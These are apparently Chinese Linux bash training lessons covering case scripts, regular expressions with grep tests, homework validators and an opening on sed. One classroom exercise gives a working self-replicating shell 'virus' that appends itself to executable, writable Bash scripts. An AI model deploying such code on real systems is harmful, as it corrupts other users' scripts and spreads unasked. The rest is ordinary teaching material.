class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure>
<hr>
<p>使用bash写一个脚本实现以下功能：</p>
<p>1) -r 查看系统发行版本<br>2) -k 查看系统内核版本<br>3) -d 查看系统磁盘信息<br>4) -u 查看当前系统用户<br>5) -t 查看系统运行时间<br>6) -s 查看selinux状态<br>7) -f 查看内存信息<br>8) -n 查看网络信息<br>9) -a 实现以上所有功能<br>10）–help 查看帮助</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">	REL;;	</span><br><span class="line">-k)</span><br><span class="line">	KER;;</span><br><span class="line">-d)</span><br><span class="line">	DIS;;</span><br><span class="line">-u)</span><br><span class="line">	USR;;</span><br><span class="line">-t)</span><br><span class="line">	UPT;;</span><br><span class="line">-s)</span><br><span class="line">	SEL;;</span><br><span class="line">-f)	</span><br><span class="line">	FER;;</span><br><span class="line">-n)</span><br><span class="line">	NET;;</span><br><span class="line">-a)</span><br><span class="line">	REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">	echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
<hr>
<p>用shell脚本写一个病毒，要求如下：</p>
<ol>
<li>可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；</li>
<li>执行感染后的bash shell脚本会输出”echo hello,I am evil!”</li>
<li>如果已经被感染，就不再感染</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure>
<hr>
<p>如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>






]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第三课:正则表达式</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/</url>
    <content><![CDATA[<p>Regular Expression 、 regex 或 regexp, 缩写为 RE 正则表达式这个概念最初是由 Unix 中的工具软件 ( 例如 sed 和 grep) 普及开的。</p>
<p>通常被用来检索、替换那些符合某个规则的文本。</p>
<p>许多程序设计语言都支持正则表达是进行字符串操作。例如，在perl中就内建了一个功能强大的正则表达式引擎，还有java语言自带的。</p>
<p>起源于科学家对人类神经系统工作原理的早期研究；Ken Thompson将其应用到计算搜索算法 ，Unix之父将此引入到编辑器QED，后来的ed，最终引入grep。</p>
<p>概念：</p>
<p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、以及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p>
<h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><ul>
<li>正则表达式就是记录文本规则的代码</li>
<li>和通配符类似,正则表达式也是用来进行文本匹配的工具,只不过比起通配符,它能更精确地描述你的需求</li>
</ul>
<p>字符和字符串：</p>
<ul>
<li>字符是计算机软件处理文字时最基本的单位,可能是字母,数字,标点符号,空格,换行符,汉字等等</li>
<li>字符串是0个或更多个字符的序列。</li>
</ul>
<p>特点：</p>
<ol>
<li>灵活性、逻辑性和功能性非常强；</li>
<li>可以迅速地用极简单的方式达到字符串的复杂控制；</li>
<li>对于刚接触的人来说，比较晦涩难懂。</li>
</ol>
<p>应用程序：<br>grep,egrep,awk,mysql,vim</p>
<h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特殊字符 	代表意义</span><br><span class="line">[:alnum:] 代表英文大小写字符及数字 ,0-9, A-Z, a-z</span><br><span class="line">[:alpha:] 代表任何英文大小写字符 , A-Z, a-z</span><br><span class="line">[:lower:] 代表小写字符 , a-z</span><br><span class="line">[:upper:] 代表大写字符 ,A-Z</span><br><span class="line">[:digit:] 代表数字而已 , 0-9</span><br><span class="line">[:xdigit:] 代表 16 进制数字 , 因此包括 : 0-9, A-F, a-f</span><br><span class="line">[:blank:] 代表空格键和 [Tab] 按键</span><br><span class="line">[:space:] 任何会产生空白的字符,包括空格键 , [Tab], CR 等等</span><br><span class="line">[:graph:] 除了空格键 ( 空格键和 [Tab] ) 外的其他所有按键</span><br><span class="line">[:cntrl:] 代表键盘上面的控制按键 , 包括 CR, LF, Tab, Del.. 等等</span><br><span class="line">[:print:] 代表任何可以被打印出来的字符</span><br><span class="line">[:punct:] 代表标点符号 (punctuation symbol) :&quot; &#39; ? ! ; : # $...</span><br></pre></td></tr></table></figure>
<h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符 	描述</span><br><span class="line">\cx 	匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &#39;c&#39; 字符。</span><br><span class="line">\f 	匹配一个换页符。等价于 \x0c 和 \cL。</span><br><span class="line">\n 	匹配一个换行符。等价于 \x0a 和 \cJ。</span><br><span class="line">\r 	匹配一个回车符。等价于 \x0d 和 \cM。</span><br><span class="line">\s 	匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</span><br><span class="line">\S 	匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</span><br><span class="line">\t 	匹配一个制表符。等价于 \x09 和 \cI。</span><br><span class="line">\v 	匹配一个垂直制表符。等价于 \x0b 和 \cK</span><br></pre></td></tr></table></figure>
<h3 id="常见的正则表达式"><a href="#常见的正则表达式" class="headerlink" title="常见的正则表达式"></a>常见的正则表达式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ 	行首定位符</span><br><span class="line">$ 	行尾定位符</span><br><span class="line">. 	匹配除换行符之外的单个字符</span><br><span class="line">* 	匹配 0 个或多个前一字符</span><br><span class="line">? 	匹配 0 个或1个前一字符</span><br><span class="line">+	匹配 1 个或多个前一个字符</span><br><span class="line">[ ] 	匹配指定字符组内的任一字符</span><br><span class="line">[^] 	匹配不在指定字符组内的任一字符</span><br><span class="line">\&lt; 	单词起始边界匹配符</span><br><span class="line">\&gt; 	单词结束边界匹配符</span><br><span class="line">x\&#123;m\&#125;	连续 M 个字符 X</span><br><span class="line">x\&#123;m,\&#125; 至少 M 个字符 X</span><br><span class="line">x\&#123;m,n\&#125;至少 M 个最多 N 个字符 X</span><br></pre></td></tr></table></figure>

<h3 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h3><blockquote>
<p>写一个测试脚本re.sh;带位置参数执行，例如 re.sh ab</p>
</blockquote>
<h4 id="代表以a开头的"><a href="#代表以a开头的" class="headerlink" title="代表以a开头的"></a>代表以a开头的</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^a  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<h4 id="代表以a结尾的"><a href="#代表以a结尾的" class="headerlink" title="代表以a结尾的"></a>代表以a结尾的</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a$  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ba</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>


<h4 id="代表a字符后面一定有两个字符"><a href="#代表a字符后面一定有两个字符" class="headerlink" title="代表a字符后面一定有两个字符"></a>代表a字符后面一定有两个字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a..  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh axx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxxx</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>

<h4 id="代表匹配a字符后面可以是0个b，也可以是多个b"><a href="#代表匹配a字符后面可以是0个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是0个b，也可以是多个b"></a>代表匹配a字符后面可以是0个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab*  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbbxxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure>


<h4 id="匹配-0-个或1个前一字符"><a href="#匹配-0-个或1个前一字符" class="headerlink" title="匹配 0 个或1个前一字符"></a>匹配 0 个或1个前一字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ 1a?1 ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh 11</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1aa1</span><br><span class="line">no</span><br></pre></td></tr></table></figure>

<h4 id="代表匹配a字符后面可以是1个b，也可以是多个b"><a href="#代表匹配a字符后面可以是1个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是1个b，也可以是多个b"></a>代表匹配a字符后面可以是1个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab+ ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ac</span><br><span class="line">no</span><br></pre></td></tr></table></figure>


<h4 id="代表匹配ab字符，后面可以是任意字符"><a href="#代表匹配ab字符，后面可以是任意字符" class="headerlink" title="代表匹配ab字符，后面可以是任意字符"></a>代表匹配ab字符，后面可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab.*  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure>

<h4 id="代表匹配a和b字符之间可以是任意字符"><a href="#代表匹配a和b字符之间可以是任意字符" class="headerlink" title="代表匹配a和b字符之间可以是任意字符"></a>代表匹配a和b字符之间可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a.*b  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh a1b</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1b1</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<h4 id="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"><a href="#代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符" class="headerlink" title="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"></a>代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">no</span><br></pre></td></tr></table></figure>

<h4 id="代表匹配不在指定字符组内的任一字符"><a href="#代表匹配不在指定字符组内的任一字符" class="headerlink" title="代表匹配不在指定字符组内的任一字符"></a>代表匹配不在指定字符组内的任一字符</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [^Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
<p><strong>测试：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>



<h4 id="单词起始和结束边界匹配符与行首行尾的匹配对比"><a href="#单词起始和结束边界匹配符与行首行尾的匹配对比" class="headerlink" title="单词起始和结束边界匹配符与行首行尾的匹配对比"></a>单词起始和结束边界匹配符与行首行尾的匹配对比</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^booboo" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">[root@rhel6 ~]# grep "\&lt;booboo" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;booboo" re.file</span><br><span class="line">[root@rhel6 ~]# grep "\&gt;jack" re.file</span><br><span class="line">[root@rhel6 ~]# grep "jack$" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">[root@rhel6 ~]# grep "jack\&gt;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br></pre></td></tr></table></figure>
<h4 id="某个字符数量限定"><a href="#某个字符数量限定" class="headerlink" title="某个字符数量限定"></a>某个字符数量限定</h4><ul>
<li>x{m}连续 M 个字符 X       x{3} =3<ul>
<li>x{m,} 至少 M 个字符 Xx{3,} &gt;=3</li>
</ul>
</li>
<li>x{m,n} 至少 M 个最多 N 个字符 X x{3,4} &gt;=3 &lt;=4</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;0\&#125;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">jack</span><br><span class="line"> jack</span><br><span class="line">jack</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;1\&#125;" re.file</span><br><span class="line">booboo	tom	jack</span><br><span class="line">jack	tom	booboo</span><br><span class="line">tom tom	tom</span><br><span class="line">booo</span><br><span class="line">boo</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line">[root@rhel6 ~]# grep "o\&#123;4\&#125;" re.file</span><br><span class="line">f	fo	foo	fooo	foooo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ o&#123;2,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# bash re.sh foo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh fooof</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh foof</span><br><span class="line">no</span><br></pre></td></tr></table></figure>
<h4 id="digit-代表数字而已-0-9"><a href="#digit-代表数字而已-0-9" class="headerlink" title="[:digit:]代表数字而已 , 0-9"></a>[:digit:]代表数字而已 , 0-9</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 ~]# cat re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "^[[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">4444</span><br><span class="line">[root@rhel6 ~]# grep "[^[:digit:]]" re.file1</span><br><span class="line">45aa</span><br><span class="line">sdfsdf</span><br><span class="line">[root@rhel6 ~]# grep "^[^[:digit:]]" re.file1</span><br><span class="line">sdfsdf</span><br></pre></td></tr></table></figure>
<h3 id="课堂作业"><a href="#课堂作业" class="headerlink" title="课堂作业"></a>课堂作业</h3><blockquote>
<p>1.说出下面匹配的内容</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">^a 以a开头</span></span><br><span class="line"><span class="meta">#</span><span class="bash">b? b的个数0或者1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">c+ c的个数&gt;=1</span></span><br><span class="line"><span class="meta">#</span><span class="bash">d.*e d和e之间可以是任意字符</span></span><br><span class="line"><span class="meta">#</span><span class="bash">f$ 以f结尾</span></span><br><span class="line">if [[ $1 =~ ^ab?c+d.*ef$ ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h3 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h3><blockquote>
<p>1.if判断匹配ip地址</p>
</blockquote>
<blockquote>
<p>2.if判断匹配邮件地址格式为<a href="mailto:9aA@9aA.com">9aA@9aA.com</a></p>
</blockquote>
<blockquote>
<p>3.grep 过滤空白行</p>
</blockquote>
<blockquote>
<p>4.grep 过滤以空格开头的行</p>
</blockquote>
<blockquote>
<p>5.针对/usr/share/dict/words文件做过滤</p>
</blockquote>
<blockquote>
<p> 1）列出文件中包含 先有字母t，然后中间有一个元音字母，之后是sh的单词；</p>
</blockquote>
<blockquote>
<p> 2）列出文件中包含 先有字母t，然后中间有若干个元音字母，之后是sh的单词；</p>
</blockquote>
<blockquote>
<p> 3）列出文件中刚好包含16个字母的单词。**</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$ ]]</span><br><span class="line">then</span><br><span class="line">	IP=($&#123;1//\./ &#125;)</span><br><span class="line">	[ $&#123;IP[0]&#125; -gt 0 -a $&#123;IP[0]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[1]&#125; -ge 0 -a $&#123;IP[1]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[2]&#125; -ge 0 -a $&#123;IP[2]&#125; -lt 255 ] &amp;&amp; [ $&#123;IP[3]&#125; -gt 0 -a $&#123;IP[3]&#125; -lt 255 ] &amp;&amp; echo ok || echo no</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">        echo "this is not IPADDR!"</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^[0-9a-zA-Z]+@[0-9a-zA-Z]+\.com$  ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@rhel6 ~]# grep "^$" re.file2</span><br><span class="line"></span><br><span class="line">grep '^t[a-zA-Z]sh' /usr/share/dict/words</span><br><span class="line">grep '^t[a-zA-Z]\+sh' /usr/share/dict/words</span><br><span class="line">grep -E '^[a-zA-Z0-9]&#123;16&#125;$' /usr/share/dict/words                         </span><br><span class="line">grep '^[a-zA-Z0-9]\&#123;16\&#125;$' /usr/share/dict/words</span><br></pre></td></tr></table></figure>


<h3 id="晚自习作业"><a href="#晚自习作业" class="headerlink" title="晚自习作业"></a>晚自习作业</h3><ol>
<li>完成所有练习</li>
<li>帐号是否合法（字母开头，允许5-16位，只能包含字母数字下划线）</li>
<li>密码是否合法（字母开头，允许6-18位，只能包含字母数字下划线和！@#）</li>
<li>匹配日期2016-10-11<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span> [[ <span class="variable">$1</span> =~ ^[0-9]&#123;4&#125;-[0-9]&#123;2&#125;-[0-9]&#123;2&#125;$ ]]</span></span><br><span class="line">if [[ $1 =~ ^[0-9]&#123;4&#125;-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[1-9]|3[01])$ ]]</span><br><span class="line">then</span><br><span class="line">	echo ok</span><br><span class="line">else</span><br><span class="line">	echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>LinuxBash脚本教程</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>LinuxBash脚本</tag>
      </tags>
  </entry>
  <entry>
    <title>LINUX Shell Scripts 第四课 Sed</title>
    <url>/2016/12/23/booboo_bash_shell_scripts/03_shell_sed_awk/</url>
    <content><![CDATA[<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h3 id="什么是sed"><a href="#什么是sed" class="headerlink" title="什么是sed"></a>什么是sed</h3><p>sed( 意为流编辑器 , 源自英语 “ stream editor” 的缩写 ) 是 Unix 常见的命令行程序。 sed 用来把文档或字符串里面的文字经过一系列编辑命令转换为另一种格式输出。 sed 通常 用来匹配一个或多个正则表达式的文本进行处理。 分号 (;) 可以用作分隔命令的指示符。尽管 sed 脚本固有的很多限制 , 一连串的 sed 指令加起来可以编程像 仓 库番、快打砖块、甚至俄罗斯方块等电脑游戏的复杂程序。</p>
<h3 id="如何使用sed"><a href="#如何使用sed" class="headerlink" title="如何使用sed"></a>如何使用sed</h3><h4 id="语法模式"><a href="#语法模式" class="headerlink" title="语法模式"></a>语法模式</h4><p>• 命令行模式<br>• 脚本模式</p>
<p>命令行模式</p>
<p>sed 流编辑器 针对行进行操作的</p>
<h4 id="sed命令的原理"><a href="#sed命令的原理" class="headerlink" title="sed命令的原理"></a>sed命令的原理</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">读文件---一行一行读</span><br><span class="line">存入缓存空间</span><br><span class="line">匹配行---是---动作--继续读取</span><br><span class="line">     ---不是------ 继续读取    </span><br><span class="line">读到最后一行为止</span><br><span class="line">输出</span><br></pre></td></tr></table></figure>

